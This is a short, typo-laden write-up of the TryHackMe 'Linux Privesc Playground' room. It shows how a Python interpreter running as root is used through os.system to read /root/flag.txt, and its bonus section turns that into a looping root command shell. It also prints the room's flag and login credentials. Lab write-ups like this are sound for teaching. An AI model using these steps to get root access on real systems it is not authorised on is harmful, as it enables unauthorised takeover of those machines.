# Linux Privesc Playground - Try Hack Me - https://tryhackme.com/room/privescplayground
## This is my first Write-up but a simple one to preform.


### 1. lets get in the machine and open python 

SSH Credentials - user:password

so there is a "trick" to gain an easy shell with the help of python
first we have to see if python is installed and has root premonition so we could exploit it
 
$ python
```
>>>
```

great! we got python installed, lets continue.

now we are in the python interactive shell, this is sort of a testing ground for coders.
but for us, its just a convenient way to get a shell.

we only need to init one library for OS commands
```python
>>> import os
```
now, lets see if we are root. (euid = 0:root)
```python
>>> geteuid()
```
> 0

Grate! python user has root privileges! lets use that ofc...
the syntax should look like this 

```python
os.system("whoami")
```

>root
0


note you can press the arrow-key-up button to toggle previous commands exactly like a regular shell

### 2. Get The Flag!
to get the flag we will do the following

```python
os.system("cat /root/flag.txt")
```
> THM{3asy_f14g_1m40}


 

___
# bonus:

do you want to make your life easyer? (that's what python ment for)
 

```python
def A(i):
    os.system(i)
```

press return key (enter)


now all we need to do is A("YOUR COMMAND GOES HERE")

```
A('whoami')
```
>root
0

# Even better:

```
while True:
    i = input('CMD: ')
    os.system(i)
press return key (enter)
```
> CMD:
```
CMD: whoami
```
>root
0


now we go a loop and created our-self an easy root shell!

# Hye! if you done the bonus why not get in to a python course?
you can do so much in python, i recommanding this tutorial by microsoft as it's easy and fun to watch (as mach as it can be...)
https://www.youtube.com/watch?v=eHxoh9Rrtdk